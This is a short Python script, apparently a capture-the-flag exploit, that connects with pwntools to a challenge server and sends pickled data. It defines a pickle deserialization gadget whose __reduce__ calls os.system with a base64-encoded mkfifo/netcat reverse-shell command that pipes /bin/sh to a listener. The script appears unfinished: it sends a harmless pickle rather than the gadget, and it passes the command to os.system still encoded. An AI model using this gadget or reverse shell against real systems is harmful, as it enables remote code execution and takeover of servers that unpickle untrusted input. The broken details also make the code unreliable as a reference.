import pickle
import base64
import os
from pwn import remote


cmd = base64.b64encode(b'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')


class RCE:
    def __reduce__(self):
        return os.system, (cmd,)


def rce():
    print('hi')


def main():
    r = remote("mc.ax", 31773)

    pickled = pickle.dumps('a', protocol=0)
    print(pickled)

    # print(bytes(pickled).decode())
    assert pickled.split()[0] == pickled

    r.sendline(pickled.decode())
    print(r.recvall(timeout=3).decode())


if __name__ == '__main__':
    main()
